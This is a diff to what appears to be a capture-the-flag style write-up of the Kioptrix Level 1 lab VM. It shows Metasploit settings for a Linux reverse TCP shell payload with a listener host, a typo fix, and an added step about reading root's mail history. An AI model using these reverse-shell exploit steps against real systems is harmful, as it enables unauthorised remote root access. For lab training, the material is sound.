@@ -34,4 +34,5 @@ set payload linux/x86/shell_reverse_tcp
 set lhost 10.10.10.10
 exploit
 
-I had to try runnign exploit several times - I'm not sure why it seemed to get stuck in trying dozens of return addresses. Either way, this worked and provided a reverse shell! Running uname -a shows the kioptrix.level1 name. whoami shows root.
+I had to try running exploit several times - I'm not sure why it seemed to get stuck in trying dozens of return addresses. Either way, this worked and provided a reverse shell! Running uname -a shows the kioptrix.level1 name. whoami shows root.
+6) Out of curiosity, I checked /bin/bash -i and ran the history command. The only standout was mail. Running mail and selecting the first message revealed a nice easter egg of a congratulations from the developer.
